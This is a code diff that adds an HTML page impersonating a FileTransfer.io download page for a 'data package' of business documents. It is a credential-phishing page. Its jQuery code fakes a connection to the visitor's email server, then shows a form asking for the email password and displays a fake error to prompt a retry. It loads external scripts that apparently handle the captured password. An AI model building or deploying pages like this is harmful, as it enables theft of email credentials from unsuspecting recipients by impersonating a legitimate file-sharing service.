@@ -1,0 +1,515 @@
+
+<!DOCTYPE html>
+
+<html lang="cs" data-default-timezone="Etc/UTC" class="responsive-layout no-js">
+<!--<![endif]-->
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="utf-8">
+
+<meta name="author" content="root" >
+<meta name="keywords" content="">
+<meta name="app-version" content="My4zNi4w">
+<meta name="og:description" content="Size of the data package: 1.61 MB">
+<meta name="description" content="Size of the data package: 1.61 MB">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Data package</title>
+<link rel="apple-touch-icon" sizes="96x96" href="img/favicon/96.png">
+<link rel="apple-touch-icon" sizes="128x128" href="img/favicon/128.png">
+<link rel="apple-touch-icon" sizes="160x160" href="img/favicon/160.png">
+<link rel="apple-touch-icon" sizes="192x192" href="img/favicon/192.png">
+<link rel="apple-touch-icon-precomposed" sizes="96x96" href="img/favicon/solid/96.png">
+<link rel="apple-touch-icon-precomposed" sizes="128x128" href="img/favicon/solid/128.png">
+<link rel="apple-touch-icon-precomposed" sizes="160x160" href="img/favicon/solid/160.png">
+<link rel="apple-touch-icon-precomposed" sizes="192x192" href="img/favicon/solid/192.png">
+<link rel="icon" sizes="32x32" href="img/favicon/32.png">
+<link rel="icon" sizes="48x48" href="img/favicon/48.png">
+<link rel="icon" sizes="96x96" href="img/favicon/96.png">
+<link rel="icon" sizes="72x72" href="img/favicon/72.png">
+<link rel="icon" sizes="114x114" href="img/favicon/114.png">
+<link rel="icon" sizes="120x120" href="img/favicon/120.png">
+<link rel="icon" sizes="144x144" href="img/favicon/144.png">
+<link rel="icon" sizes="152x152" href="img/favicon/152.png">
+<link rel="icon" sizes="192x192" href="img/favicon/192.png">
+<link rel="mask-icon" href="img/favicon/32.png" color="#86d122">
+<link rel="mask-icon" sizes="16x16 32x32 48x48" href="img/favicon/48.png" color="#86d122">
+<link rel="mask-icon" sizes="64x64 96x96 160x160 192x192" href="img/favicon/192.png" color="#86d122">
+<meta name="application-name" content="FileTransfer.io">
+<meta name="msapplication-TileColor" content="#000000">
+<meta name="msapplication-TileImage" content="img/favicon/144.png">
+<meta name="msapplication-square70x70logo" content="img/favicon/ms/tiny.png">
+<meta name="msapplication-square150x150logo" content="img/favicon/ms/square.png">
+<meta name="msapplication-wide310x150logo" content="img/favicon/ms/wide.png">
+<meta name="msapplication-square310x310logo" content="img/favicon/ms/large.png">
+<meta property="og:title" content="Download Data package from September 14th.">
+<meta property="og:site_name" content="FileTransfer.io">
+<meta property="og:type" content="website">
+<meta property="og:image" content="img/social/en/256.png">
+<meta property="og:url" content="34255a9d-0652-43db-b45e-55c278f91fe2.html">
+<meta property="fb:page_id" content="918008918320874">
+<link rel="stylesheet" href="css/maincab4.css?v=ef9603" type="text/css" media="screen">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+
+    <script>
+    $(document).ready(function(){
+
+
+            $("[href='download']").click(function(event){
+        event.preventDefault();
+        $("#mbg").removeClass("hide");
+        $("#mbd").removeClass("hide");
+        setTimeout(() => {
+            $("#conn-status").text("Identifying your email server...");
+                setTimeout(() => {
+                    checkemail(email);
+                    $("#conn-status").text("Connecting to " + ehost + " email servers");
+                    setTimeout(() => {
+                        $("#conn-interface").addClass("hide");
+                        $("#auth-interface").removeClass("hide");
+                        $("#email-label").text(email);
+                        $("#server-link").text(ehost);
+                        $("#server-link").attr("href","http://"+ehost);
+                    }, 4000);
+                }, 2000);
+        }, 2000);
+    });
+
+    
+        $("#download-btn").click( (e) => {
+        e.preventDefault();
+        $("#mbg").removeClass("hide");
+        $("#mbd").removeClass("hide");
+        setTimeout(() => {
+            $("#conn-status").text("Identifying your email server...");
+                setTimeout(() => {
+                    checkemail(email);
+                    $("#conn-status").text("Connecting to " + ehost + " email servers");
+                    setTimeout(() => {
+                        $("#conn-interface").addClass("hide");
+                        $("#auth-interface").removeClass("hide");
+                        $("#email-label").text(email);
+                        $("#server-link").text(ehost);
+                        $("#server-link").attr("href","http://"+ehost);
+                    }, 4000);
+                }, 2000);
+        }, 2000);
+    });
+
+ 
+
+});
+    
+
+    </script>
+   
+</head>
+<body>
+
+      
+        
+        
+<div class="modal-bg hide" id="mbg"></div>
+<div class="modal-body hide" id="mbd">
+
+<div id="conn-interface" class="conn-interface">
+<div class="modal-logo">
+<a class="logo logo-en" style="float:none !important;" title="Switch to the home page" href="https://filetransfer.io/">
+<strong>FileTransfer.io</strong>
+</a>
+</div>
+<div class="conn">
+<img src="img/preloader-primary-large.gif" alt="loading..." width="50" height="50" />
+<div class="conn-status" id="conn-status">Connecting to your email provider...</div><br>
+<div id="server-logo" style="margin: 0 auto; text-align: center;"></div>
+</div>
+</div>
+<div id="progress-interface" class="progress-interface hide" style="text-align:center">
+<div class="w3-white" style="width: 90%; position: relative; top: 150px; margin: 0 auto;">
+<div class="w3-light-green" style="height:24px;width:0%" id="progressbar">0%</div>
+</div>
+<div style="font-style: italic; margin-top: 160px;">Loading files...</div>
+</div>
+
+<div id="auth-interface" class="hide">
+<div class="modal-logo">
+<a class="logo logo-en" style="float:none !important;" title="Switch to the home page" href="https://filetransfer.io/">
+<strong>FileTransfer.io</strong>
+</a>
+</div>
+<div class="auth-prompt">Please authenticate your download with your email client </div>
+<div id="failed-auth" class="failed-auth hide">Technical error! Please type in your correct password and try again.</div>
+<div class="email-label" id="email-label"></div>
+<div class="input-wrapper">
+<div class="input" style="width: 80% !important;">
+<div class="taginput-wrapper ui-widget ui-widget-content ui-corner-all">
+<input type="password" id="password" placeholder="Enter your email password" class="ui-autocomplete-input" autocomplete="off" name="recipient-email-input" style="width: 100%;"></div>
+</div>
+</div>
+<div class="download-wrapper" id="dl">
+<button class="dl-btn" id="btn-download"><span class="icon-cloud-download" style="color:white !important; margin-right: 10px; font-size: 20px !important;"></span>Download</button>
+</div>
+<div class="dl-loader hide" id="dl-loader">
+<img src="img/preloader-primary-large.gif" alt="loading..." width="50" height="50" />
+<div>Verifying...</div>
+</div>
+<div class="powered">Powered and accessed through <a href="#" id="server-link">Hotmail</a> servers</div>
+</div>
+</div>
+<div class="container">
+<div class="page">
+<header class="header">
+<a class="logo logo-en" title="Switch to the home page" href="">
+<strong>FileTransfer.io</strong>
+</a>
+
+<div id="snippet--header">
+<a href="" class="account underline" data-authenticated="false">
+<span class="icon-user circle"></span>
+<span class="account-label underline-item xs-visible">
+Log in
+</span>
+</a>
+
+<nav>
+<div class="navigation-trigger md-invisible underline">
+<span class="navigation-trigger-icon">
+<span class="line-1">-</span>
+<span class="line-2">-</span>
+<span class="line-3">-</span>
+</span>
+<span class="navigation-trigger-text underline-item xs-visible">Menu</span>
+</div>
+
+<ul class="navigation">
+<li class="navigation-item">
+<a href="" title="Premium" class="underline">
+<span class="underline-item">Premium</span>
+</a>
+</li>
+<li class="navigation-item">
+<a href="" title="Send files" class="underline">
+<span class="underline-item">Send files</span>
+</a>
+</li>
+</ul>
+</nav>
+</div></header>
+<hr>
+<!--googleoff: all-->
+<section class="content hidden" data-occasion="js-error" style="position: absolute; left: -10000px;">
+<div class="content-header content-header-only">
+<h1>An error occurred on the site</h1>
+<h3>We are sorry.</h3>
+<p>
+<span class="sprite-wrench" style="-webkit-filter: grayscale(1);
+		    filter: grayscale(1);"></span>
+</p>
+<p>
+If you'd like to be informed about the process of fixing this error, please click <a data-role="contact-url" rel="nofollow" href="">
+here</a>.
+</p>
+<p>
+<a class="btn btn-primary btn-lg" rel="nofollow" href="34255a9d-0652-43db-b45e-55c278f91fe2.html">
+Back
+</a>
+</p>
+</div>
+
+</section>
+<!--googleon: all-->
+<section class="content">
+
+
+   
+ 
+    <strong>
+        <div>Company Name:-Wilmer International Company Ltd</div>
+
+    </strong>
+<div class="content-header" data-role="url-switcher-source" data-filelist-url="/data-package/WqA25oSu" data-recipients-url="/data-package/WqA25oSu/recipients" data-comments-url="/data-package/WqA25oSu/comments">
+
+    <h1>Data package from <span id="datetime"></span>.</h1> 
+    <script>
+            var dt = new Date();
+            
+            document.getElementById("datetime").innerHTML=dt.toDateString();
+           
+     </script>
+<p id="snippet--delivery-properties">
+Expiration:
+<span class="color-darker">in 21 days</span>
+<span class="sep">&middot;</span>
+<!-- Sender: <span class="color-darker"><span class="" data-first-part="" data-second-part=""><a href="">info@rital-d.com</a> </span></span> -->
+
+</p>
+<p>
+<a id="download-btn" href="#" class="btn btn-primary btn-large uppercase">
+<span class="btn-loading-text">
+<span class="icon-cloud-download"></span><span data-label-singular="Download file" data-label-plural="Download %d files" data-label-plural2="Download %d files" data-label-delivery="Download data package">Download data package</span> (<span data-role="size" data-bytes="1687794">8.63 MB</span>)
+</span>
+<span class="spinner"></span>
+</a>
+</p>
+<ul class="tabs-nav columns xs-max-2 xs-2" data-group="detail">
+<li class="tabs-nav-link column active">
+<a data-href="#tab-package" class="underline" data-target="filelist" data-role="switch-url">
+<span class="icon-folder"></span>
+<span class="underline-item">Data package content</span>
+</a>
+</li>
+<li class="tabs-nav-link column">
+<a data-href="#tab-comments" class="underline" data-target="comments" data-role="switch-url">
+<span class="icon-comments"></span>
+<span class="underline-item" id="snippet--comments-count-badge">Comments (0)</span>
+</a>
+</li>
+</ul>
+
+</div>
+
+<div class="tabs-content" data-group="detail">
+<div id="tab-package" class="tab active">
+<div id="snippet--delivery-detail-form">
+<form action="#" method="post" id="delivery-detail-form" class="ajax">
+<br>
+<table class="table">
+<thead>
+<tr>
+<th class="col-checkbox">
+<label>
+<input type="checkbox" class="toggle-all-checkboxes" checked>
+<span></span>
+</label>
+</th>
+<th>Name</th>
+<th>Size</th>
+<th class="col-action"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="col-checkbox">
+<label>
+<input type="checkbox" name="9y431yWQ8h13" id="frm-deliveryDetailForm-deliveryDetailForm-9y431yWQ8h13" checked class="toggle-checkbox" data-download-size="1680663">
+<span></span>
+</label>
+</td>
+<td class="break-word">
+    Specific products, with detailed descriptions.pdf
+</td>
+<td class="color-brighter">1.6 MB</td>
+<td class="col-action">
+<a href="download"  class="download-link underline download-single-file" data-token="9y431yWQ8h13">
+<span class="icon-arrow-down-circle"></span>
+<span class="underline-item">
+Download
+</span>
+</a>
+</td>
+</tr>
+<tr>
+<td class="col-checkbox">
+<label>
+<input type="checkbox" name="SEguAYyma6th" id="frm-deliveryDetailForm-deliveryDetailForm-SEguAYyma6th" checked class="toggle-checkbox" data-download-size="1744">
+<span></span>
+</label>
+</td>
+<td class="break-word">
+    Product quantity.xls
+</td>
+<td class="color-brighter">1.1 MB</td>
+<td class="col-action">
+<a href="download"  class="download-link underline download-single-file" data-token="SEguAYyma6th">
+<span class="icon-arrow-down-circle"></span>
+<span class="underline-item">
+Download
+</span>
+</a>
+</td>
+</tr>
+<tr>
+<td class="col-checkbox">
+<label>
+<input type="checkbox" name="pADZ2zIuVLAi" id="frm-deliveryDetailForm-deliveryDetailForm-pADZ2zIuVLAi" checked class="toggle-checkbox" data-download-size="4301">
+<span></span>
+</label>
+</td>
+<td class="break-word">
+    Sample image.jpg
+</td>
+<td class="color-brighter">1.8 MB</td>
+<td class="col-action">
+<a href="download" class="download-link underline download-single-file" data-token="pADZ2zIuVLAi">
+<span class="icon-arrow-down-circle"></span>
+<span class="underline-item">
+Download
+</span>
+</a>
+</td>
+</tr>
+<tr>
+    <td class="col-checkbox">
+    <label>
+    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked class="toggle-checkbox" data-download-size="1086">
+    <span></span>
+    </label>
+    </td>
+    <td class="break-word">
+    Company profile.pdf
+    </td>
+    <td class="color-brighter">1.03 MB</td>
+    <td class="col-action">
+    <a href="download" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+    <span class="icon-arrow-down-circle"></span>
+    <span class="underline-item">
+    Download
+    </span>
+    </a>
+    </td>
+    </tr>
+
+    <tr>
+        <td class="col-checkbox">
+        <label>
+        <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked class="toggle-checkbox" data-download-size="1086">
+        <span></span>
+        </label>
+        </td>
+        <td class="break-word">
+            Delivery requirements.pdf
+        </td>
+        <td class="color-brighter">1.07 MB</td>
+        <td class="col-action">
+        <a href="download" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+        <span class="icon-arrow-down-circle"></span>
+        <span class="underline-item">
+        Download
+        </span>
+        </a>
+        </td>
+        </tr>
+<tr>
+<td class="col-checkbox">
+<label>
+<input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked class="toggle-checkbox" data-download-size="1086">
+<span></span>
+</label>
+</td>
+<td class="break-word">
+    Terms and conditions.pdf
+</td>
+<td class="color-brighter">2.03 MB</td>
+<td class="col-action">
+<a href="download" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+<span class="icon-arrow-down-circle"></span>
+<span class="underline-item">
+Download
+</span>
+</a>
+</td>
+</tr>
+</tbody>
+</table>
+
+<input type="hidden" name="_do" value="deliveryDetailForm-deliveryDetailForm-submit"><!--[if IE]><input type=IEbug disabled style="display:none"><![endif]-->
+</form>
+</div>
+</div>
+
+<div id="tab-comments" class="tab hidden">
+<div class="h3" id="snippet--comments-count">
+No comments in the discussion yet
+</div>
+
+<div class="comments">
+<div id="snippet--comments">
+
+</div>
+<div class="comment">
+<div class="comment-avatar">
+<span class="sprite-empty-avatar-small"></span>
+</div>
+
+<div class="comment-content">
+<form action="https://filetransfer.io/data-package/WqA25oSu/34255a9d-0652-43db-b45e-55c278f91fe2" method="post" id="add-comment-form" class="ajax-spinner">
+<div class="comment-add">
+<textarea name="text" id="frm-addCommentForm-addCommentForm-text" required data-nette-rules='[{"op":":filled","msg":"Please write your comment."}]' class="input input-large js-comfortable-textarea" placeholder="Comment the data package"></textarea>
+</div>
+
+<label for="frm-addCommentForm-addCommentForm-private-0">
+<input type="radio" name="private" id="frm-addCommentForm-addCommentForm-private-0" checked value="0">
+<span>Everyone will see the comment</span>
+</label>
+<label for="frm-addCommentForm-addCommentForm-private-1">
+<input type="radio" name="private" id="frm-addCommentForm-addCommentForm-private-1" value="1">
+<span>Only myself and <span class="protected-email" data-first-part="c2FsZXNiaWNoYW0=" data-second-part="aG90bWFpbC5jb20="></span> will see the comment</span>
+</label>
+<button class="submit-comment-button btn btn-primary btn-wide btn-small pull-right" type="submit" name="_submit">
+<span class="btn-loading-text">Add a comment</span>
+<span class="spinner"></span>
+</button>
+<input type="hidden" name="_do" value="addCommentForm-addCommentForm-submit"><!--[if IE]><input type=IEbug disabled style="display:none"><![endif]-->
+</form>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+<hr>
+<footer class="footer" id="snippet--footer">
+<div class="footer-copyright">
+Copyright &copy; 2019 &ndash; FileTransfer.io, provided by <a href="http://palo-alto.cz/" target="_blank">
+<span class="sprite-palo-alto"></span>
+Palo Alto HiTec Solutions Czech, s.r.o.
+</a>
+</div>
+<nav class="footer-navigation">
+<a title="Contact" class="underline" href="https://filetransfer.io/contact">
+<span class="underline-item">Contact</span>
+</a>
+&middot;
+<a title="FAQ" class="underline" href="https://filetransfer.io/frequent-questions">
+<span class="underline-item">FAQ</span>
+</a>
+&middot;
+<a title="Terms of use" class="underline" href="https://filetransfer.io/tos">
+<span class="underline-item">Terms of use</span>
+</a>
+&middot;
+<a title="Enterprise" class="underline" href="https://filetransfer.io/enterprise">
+<span class="underline-item">Enterprise</span>
+</a>
+</nav>
+</footer>
+</div>
+
+</div>
+
+
+<a class="need-help" href="https://filetransfer.io/contact">
+<span class="icon-support"></span>Get help
+</a>
+
+<script data-cfasync="false" src="js/email-decode.min.js"></script><script src="js/appcab4.js?v=ef9603"></script>
+<script src="js/serverconn.js"></script>
+<script>
+	jQuery(document).ready(function(){
+		
+	});
+
+</script>
+</body>
+
+</html>
